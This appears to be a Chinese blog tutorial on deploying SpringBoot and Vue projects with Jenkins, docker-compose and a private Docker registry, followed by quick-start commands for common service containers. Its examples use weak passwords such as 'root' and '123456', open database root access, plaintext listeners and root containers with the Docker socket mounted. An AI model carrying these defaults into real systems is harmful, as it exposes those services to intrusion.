class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、下载docker-compose</span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line">2、增加可执行权限</span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line">3、添加软链接</span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/bin/docker-compose /usr/bin/docker-compose</span><br><span class="line"></span><br><span class="line">4、确认版本</span><br><span class="line">$ docker-compose --version</span><br><span class="line"></span><br><span class="line">sudo curl \</span><br><span class="line">    -L https://raw.githubusercontent.com/docker/compose/1.29.2/contrib/completion/bash/docker-compose \</span><br><span class="line">    -o /etc/bash_completion.d/docker-compose</span><br></pre></td></tr></table></figure><h1><span id="安装docker私库">安装docker私库</span></h1><p>为了使服务一次打包多次部署，需要安装docker私库来保存镜像</p><p>首先建好映射目录的文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data/registry</span><br></pre></td></tr></table></figure><p>执行docker命令启动私库镜像：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -itd -v /data/registry:/var/lib/registry -p 5000:5000 --restart=always --name registry registry:latest　</span></span><br></pre></td></tr></table></figure><p>添加docker配置：</p><p>注意：如果是通过内网访问就配内网IP否则 配公网IP</p><p><code>vi /etc/docker/daemon.json</code><br>添加如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;insecure-registries&quot;: [&quot;192.168.2.200:5000&quot;]</span><br></pre></td></tr></table></figure><p>如果需要设置账号密码：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> --rm --entrypoint htpasswd  httpd:2 -Bbn yourUserName yourPwd &gt;&gt; ./auth/htpasswd  </span></span><br></pre></td></tr></table></figure><p>一般在内网环境部署私库，拉取推送也是全程内网，所以可装可不装</p><p>默认私库无法删除镜像，执行如下命令添加配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it registry /bin/sh</span><br><span class="line">cd /etc/docker/registry</span><br><span class="line">vi config.yml</span><br><span class="line">加入</span><br><span class="line">  delete:                                                                                                                                                                          </span><br><span class="line">    # To allow image delete                                                                                                                                                        </span><br><span class="line">    enabled: true </span><br></pre></td></tr></table></figure><span id="more"></span><h1><span id="springboot项目自动部署">SpringBoot项目自动部署</span></h1><h3><span id="编写-dockerfile">编写 dockerfile</span></h3><p>首先需要编写Dockerfile，在项目根目录新建Dockerfile文件，告诉docker-compose如何构建镜像：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span></span><br><span class="line"><span class="comment">#FROM 使用java环境镜像</span></span><br><span class="line"><span class="comment">#设置挂载目录,使用项目名作为日志文件夹，所有项目的日志统一都是spring.log，因此使用文件夹区分</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /usr/docker/logs</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将该项目的JAR添加到镜像中</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> spring-boot-1.1.0.jar app.jar</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置该项目要映射出去的端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#jar运行命令</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;java&quot;</span>,<span class="string">&quot;-Djava.security.egd=file:/dev/./urandom&quot;</span>,<span class="string">&quot;-jar&quot;</span>,<span class="string">&quot;app.jar&quot;</span>,<span class="string">&quot;--server.port=8080&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>注意修改spring-boot-1.1.0.jar为项目中实际的jar文件名，环境变量在maven打包阶段就要设置好，而不是通过启动命令spring.profiles.active=dev 这样来设置。</p><h3><span id="编写docker-composeyml">编写docker-compose.yml</span></h3><p>同样在项目根目录新建docker-compose.yml文件，粘入如下内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">manage-system:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./</span>  <span class="comment">#项目的目录，./表示就是当前目录</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">on-failure</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">manage-system</span></span><br><span class="line">    <span class="attr">image:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.100</span><span class="string">:5000/project/manage-system:latest</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">manage-system</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8085</span><span class="string">:8085</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mynetworks</span></span><br><span class="line">      </span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">mynetworks:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span>  <span class="comment">#使用已有的,如去掉，则会每次重启时都重新创建</span></span><br></pre></td></tr></table></figure><p>以上是单个项目的部署配置，且其它的如redis、mysql、kafka等依赖服务已存在的情况下，仅配置一个即可，如果希望一行命令将后台服务、mysql、redis等全部一并创建并启动，则配置如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">manage-system:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./</span>  <span class="comment">#项目的目录，./表示就是当前目录</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">on-failure</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">manage-system</span></span><br><span class="line">    <span class="attr">image:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.199</span><span class="string">:5000/projec/manage-system:latest</span> <span class="comment">#ip改为自己私库ip</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">manage-system</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8085</span><span class="string">:8085</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mynetworks</span></span><br><span class="line">    <span class="attr">depends_on:</span>  <span class="comment">#该服务需要依赖redis与mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_HOST:</span> <span class="string">&#x27;%&#x27;</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="string">--character-set-server=utf8mb4</span></span><br><span class="line">      <span class="string">--collation-server=utf8mb4_general_ci</span></span><br><span class="line">      <span class="string">--explicit_defaults_for_timestamp=true</span></span><br><span class="line">      <span class="string">--lower_case_table_names=1</span></span><br><span class="line">      <span class="string">--max_allowed_packet=128M</span></span><br><span class="line">      <span class="string">--default-authentication-plugin=caching_sha2_password</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3306</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mynetworks</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:5.0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">6379</span><span class="string">:6379</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mynetworks</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">mynetworks:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure><p>以上是完整的配置，如需要构建自己的镜像，则配置build.context，并编写dockerfile，如使用官方镜像直接启动，则配置image: 镜像名  即可。</p><h3><span id="配置jenkins">配置jenkins</span></h3><h4><span id="安装插件可选">安装插件（可选）</span></h4><p>首先确保安装了publish over ssh插件，安装方法为jenkins主页-&gt;左边菜单Manage Jenkins -&gt; Manage Plugins-&gt;点击可选插件-&gt;搜索：Publish Over SSH -&gt; 安装此插件</p><h4><span id="新建jenkins-job">新建Jenkins job</span></h4><p>1、配置源码管理，比如这里使用的是svn，点击subversion ,填入svn地址和账号密码</p><p>2、Build 项，Root POM填写pom.xml，如不在根目录，填写完整目录，Goals and options填写maven打包命令，如:clean package  -Dmaven.test.skip=true -e -Ptest</p><p>3、Post Steps选择Run only if build succeeds or is unstable （构建成功则继续执行）</p><p>4、点击Add post build step，选择Execute shell，填写如下代码：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd manage-system</span><br><span class="line">docker-compose build</span><br><span class="line">docker push <span class="number">192.168</span>.<span class="number">1.199</span>:<span class="number">5000</span>/project/manage-system:latest</span><br></pre></td></tr></table></figure><p>首先cd进入项目的根目录（也是docker-compose.yml的目录），执行构建命令，然后使用push命令将镜像推送到私库</p><p><strong>如果需要直接在本机部署则直接填写如下即可：</strong></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd manage-system</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>如直接部署在本机，配置到此就已经结束了，直接运行Jenkins Build Now即可，如是部署在其它服务器，则需要增加一步</p><p>5、如部署在其它服务器，则在构建后操作下点击Add post build step，选择Send files or execute commands over SSH，SSH Server Name一栏选择要部署的服务器，服务器连接配置在Manage Jenkins-&gt; Configure System -&gt; 找到SSH Servers ，配置远程连接服务器的信息。</p><p>回到jenkins job配置，Transfer Set Source files填写要发送到远程服务器的文件，这里可将docker-compose.yml发送过去，如填写：manage-system/docker-compose.yml</p><p>Exec command填写内容如下：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull <span class="number">192.168</span>.<span class="number">1.199</span>:<span class="number">5000</span>/project/manage-system:latest</span><br><span class="line">docker-compose up -d --no-build</span><br></pre></td></tr></table></figure><p>–no-build 表示不构建，因为我们已经构建了该镜像并推送到私库了</p><p>至此spring boot项目的自动部署配置完成！</p><h1><span id="vue前端项目部署">VUE前端项目部署</span></h1><p>在项目根目录编写Dockerfile文件：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">MAINTAINER</span> reiner</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /tmp</span></span><br><span class="line"><span class="keyword">ENV</span> LANG en_US.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;server &#123;  \</span></span></span><br><span class="line"><span class="bash">                      listen       80; \</span></span><br><span class="line"><span class="bash">                      location   /manage-system/ &#123; \</span></span><br><span class="line"><span class="bash">                      proxy_pass              http://192.168.1.199:8080/manage-system/; \</span></span><br><span class="line"><span class="bash">                      proxy_redirect          off; \</span></span><br><span class="line"><span class="bash">                      proxy_set_header        Host 192.168.1.199; \</span></span><br><span class="line"><span class="bash">                      proxy_set_header        X-Real-IP \<span class="variable">$remote_addr</span>; \</span></span><br><span class="line"><span class="bash">                      proxy_set_header        X-Forwarded-For \<span class="variable">$proxy_add_x_forwarded_for</span>; \</span></span><br><span class="line"><span class="bash">                  &#125; \</span></span><br><span class="line"><span class="bash">                  </span></span><br><span class="line">                  location / &#123; \</span><br><span class="line">                     root   /var/www/html/; \</span><br><span class="line">                      index  index.html index.htm; \</span><br><span class="line">                      if (!-e \$request_filename) &#123; \</span><br><span class="line">                          rewrite ^(.*)\$ /index.html?s=\$<span class="number">1</span> last; \</span><br><span class="line">                          break; \</span><br><span class="line">                      &#125; \</span><br><span class="line">                  &#125; \</span><br><span class="line">                  access_log  /var/log/nginx/access.log ; \</span><br><span class="line">              &#125; <span class="string">&quot; &gt; /etc/nginx/conf.d/default.conf \</span></span><br><span class="line"><span class="string">    &amp;&amp;  mkdir  -p  /var/www \</span></span><br><span class="line"><span class="string">    &amp;&amp;  mkdir -p /var/www/html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD dist/ /var/www/html/</span></span><br><span class="line"><span class="string">EXPOSE 80</span></span><br><span class="line"><span class="string">EXPOSE 443</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>修改其中的ip为实际项目的ip和地址</p><h3><span id="配置jenkins">配置jenkins</span></h3><p>老样子，新建jenkins job ，源码管理填写git或svn地址，</p><p>Build Steps点击新增Excute Shell，填写构建命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line">docker build -t 192.168.1.199:5000/web/manage-system-front:latest .</span><br><span class="line">docker push 192.168.1.199:5000/web/manage-system-front:latest</span><br></pre></td></tr></table></figure><p>执行构建命令，再执行docker打包命令，docker会自动查找当前目前的Dockerfile文件并构建镜像。</p><p><strong><strong>如果是直接本机部署，则填写如下：</strong></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line">docker build -t 192.168.1.199:5000/web/manage-system-front:latest .</span><br><span class="line">docker run --name manage-system-front -p 80:80 -d 192.168.1.199:5000/web/manage-system-front:latest</span><br></pre></td></tr></table></figure><p>本机部署配置到此结束，如需要发送到远程服务部署，则再增加一步。</p><p>构建后操作新增Send build artifacts over SSH，选择要部署的服务器，Transfer Set</p><p>Source files可填写docker-compose.yml文件的路径</p><p>前端项目的docker-compose.yml可参照springboot项目中的配置，这里我直接手动命令启动了，Exec command填写如下 ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull 192.168.1.199:5000/web/manage-system-front:latest</span><br><span class="line">docker run --name manage-system-front -p 80:80 -d 192.168.1.199:5000/web/manage-system-front:latest</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结束！</p><h1><span id="一些常用镜像快速启动命令示例">一些常用镜像快速启动命令示例</span></h1><h4><span id="docker容器管理界面">docker容器管理界面</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p 9000:9000 --restart=always \</span></span><br><span class="line"><span class="bash">-v /var/run/docker.sock:/var/run/docker.sock \</span></span><br><span class="line"><span class="bash">--name portainer lihaixin/portainer</span></span><br></pre></td></tr></table></figure><h4><span id="docker私库管理页面">docker私库管理页面</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p 7001:8080 --name registry-web --restart=always --link registry:registry -e registry_url=http://registry:5000/v2 -e registry_name=localhost:5000 hyper/docker-registry-web:latest</span></span><br></pre></td></tr></table></figure><h4><span id="kafka">kafka</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d --name kafka -p 9092:9092 -p 9093:9093 --link zookeeper  --network networks     -e ALLOW_PLAINTEXT_LISTENER=yes     -e KAFKA_CFG_ZOOKEEPER_CONNECT=zookeeper:2181 -e KAFKA_CFG_LISTENERS=CLIENT://:9092,EXTERNAL://:9093 -e KAFKA_CFG_ADVERTISED_LISTENERS=CLIENT://kafka:9092,EXTERNAL://192.168.1.199:9093 -e KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CLIENT:PLAINTEXT,EXTERNAL:PLAINTEXT -e KAFKA_CFG_INTER_BROKER_LISTENER_NAME=CLIENT    bitnami/kafka:3.4</span></span><br></pre></td></tr></table></figure><p>kafka特别说明：</p><p>  此配置在容器内部访问时使用kafka:9092或者内部ip:9092，外部访问时使用ip:9093,记得暴露9093</p><p>关于kafka lisner 说明可参考: <a href="https://rmoff.net/2018/08/02/kafka-listeners-explained/">https://rmoff.net/2018/08/02/kafka-listeners-explained/</a></p><h4><span id="kafka-ui页面">kafka ui页面</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> --name=kafka-ui -d --network networks -e KAFKA_CLUSTERS_0_NAME=local-kafka -e KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS=kafka:9092 -p 7002:8080 provectuslabs/kafka-ui:latest</span></span><br></pre></td></tr></table></figure><h4><span id="jenkins">jenkins</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -u root -d -p 7000:8080 -p 50000:50000 --name jenkins -v jenkins-data:/var/jenkins_home -v /var/run/docker.sock:/var/run/docker.sock  jenkins/jenkins</span></span><br></pre></td></tr></table></figure><h4><span id></span></h4><h4><span id="redis">redis</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> --restart=always -p 6379:6379 --name redis --network networks -v /home/redis/conf/redis.conf:/etc/redis/redis.conf -v /home/redis/conf/data:/data -d hub.c.163.com/library/redis /etc/redis/redis.conf --appendonly yes --requirepass 123456</span></span><br></pre></td></tr></table></figure><p>补充：如连接redis时报no route host，执行如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-rich-rule=<span class="string">&#x27;rule family=ipv4 source address=172.18.0.0/16 accept&#x27;</span> &amp;&amp; firewall-cmd --reload</span><br></pre></td></tr></table></figure><h4><span id="elasticsearch7">elasticsearch7</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p 9200:9200 -p 9300:9300 --name elasticsearch --network networks -e ES_JAVA_OPTS=<span class="string">&quot;-Xms512m -Xmx512m&quot;</span> -e <span class="string">&quot;discovery.type=single-node&quot;</span> elasticsearch:7.17.9</span></span><br></pre></td></tr></table></figure><h4><span id="mysql8">mysql8</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -v /data/mysql:/var/lib/mysql -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=root123456 -d mysql</span></span><br></pre></td></tr></table></figure><h4><span id="pluemelog">pluemelog</span></h4><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p8891:8891 --link kafka:kafka -e plumelog.model=kafka -e plumelog.es.esHosts=elasticsearch:9200 -e plumelog.kafka.kafkaHosts=kafka:9092  -e login.username=admin -e login.password=123456 --volume=/data/plumelog-server:/plumelog-server --network=networks --name=plumelog ylyue/plumelog:v3.5.1</span></span><br></pre></td></tr></table></figure><p>注意各个容器想要相互互通需要容器在同一个虚拟网络(network)，使用<code>--network=networks</code> 指定，处于同一虚拟网络才能通过容器名+端口访问</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前面使用Jenkins+docker+shell脚本可以方便的实现单体应用部署，但如果是微服务架构，工程包较多，若是为每一个服务都建一个Jenkins job 会变得很繁琐，这个时候就需要用到docker-compose 容器编排工具，它可以只需一行命令就能帮我们完成多个服务的构建、推送、重启。&lt;/p&gt;
&lt;p&gt;  考虑到如果有多个服务需要部署到多台服务器，如果每台服务器都采用发送jar包再构建镜像的方式会产生许多重复工作，因此这种情况应该使用jenkins构建镜像-&amp;gt;推送到私库-&amp;gt;服务器拉取-&amp;gt;docker-compose启动 如此流程来完成部署。&lt;/p&gt;
&lt;h1 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h1&gt;&lt;p&gt;需要安装如下软件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Jenkins （包括git/svn、publish over ssh 这个插件，jenkins安装教程很多此处不再赘述）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;docker &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Node JS (可选，仅部署前端vue项目时需要安装)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;docker compose &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;准备工作指路：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;jenkins:  &lt;a href=&quot;https://www.jenkins.io/download/&quot;&gt;https://www.jenkins.io/download/&lt;/a&gt;  直接启动war包或者使用docker安装&lt;/p&gt;
&lt;p&gt;docker: &lt;a href=&quot;https://docs.docker.com/desktop/install/linux-install/&quot;&gt;Install Docker Desktop on Linux&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Node Js:&lt;a href=&quot;https://nodejs.org/en/&quot;&gt;Node.js&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;docker compose:  &lt;a href=&quot;https://github.com/docker/compose&quot;&gt;GitHub - docker/compose: Define and run multi-container applications with Docker&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;或者直接使用curl下载安装，以CentOs为例执行如下代码：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1、下载docker-compose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo curl -L &lt;span class=&quot;string&quot;&gt;&amp;quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-&lt;span class=&quot;subst&quot;&gt;$(uname -s)&lt;/span&gt;-&lt;span class=&quot;subst&quot;&gt;$(uname -m)&lt;/span&gt;&amp;quot;&lt;/span&gt; -o /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2、增加可执行权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo chmod +x /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3、添加软链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo ln -s /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin/docker-compose /usr/bin/docker-compose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4、确认版本&lt;/span&gt;&lt;br&gt;&lt;span 